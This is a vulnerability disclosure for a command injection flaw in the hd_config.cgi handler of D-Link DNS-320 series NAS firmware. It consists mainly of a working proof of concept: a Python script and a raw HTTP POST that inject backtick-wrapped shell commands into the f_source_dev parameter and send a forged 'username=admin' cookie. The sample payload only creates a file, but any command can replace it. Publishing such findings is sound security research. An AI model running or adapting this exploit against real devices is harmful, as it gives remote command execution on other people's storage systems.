# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_FMT_R12R5_2nd_DiskMGR function of the file /cgi-bin/hd_config.cgi.  The variable `f_source_dev`is passed from a POST request and is assigned to `v3` via the `sprintf` function at line 43 and invoked by the `system` command, it can lead to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723736014426-7d88430e-e077-4a10-9200-d28f8e60ec6a.png#averageHue=%23fafaf9&clientId=u074704ca-4b47-4&from=paste&height=204&id=uf5703a54&originHeight=204&originWidth=1002&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36729&status=done&style=none&taskId=u9e95d2ae-536b-4165-8ca0-343680181a4&title=&width=1002)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723736019123-7c0990bc-da16-438f-8273-6c528438d547.png#averageHue=%23fefefd&clientId=u074704ca-4b47-4&from=paste&height=121&id=u4bedaffe&originHeight=121&originWidth=1184&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19577&status=done&style=none&taskId=ufc713e75-08be-4879-8309-92661d7f528&title=&width=1184)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/hd_config.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_FMT_R12R5_2nd_DiskMGR&f_volume_name=1&f_source_dev=`touch+/tmp/129`,`touch+/tmp/129`&f_file_system=1&f_newly_dev=1"
response = requests.post(url, headers=headers, data=data)
print(response.text)
```

```
POST /cgi-bin/hd_config.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 70
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_FMT_R12R5_2nd_DiskMGR&f_volume_name=1&f_source_dev=`touch+/tmp/129`,`touch+/tmp/129`&f_file_system=1&f_newly_dev=1
```

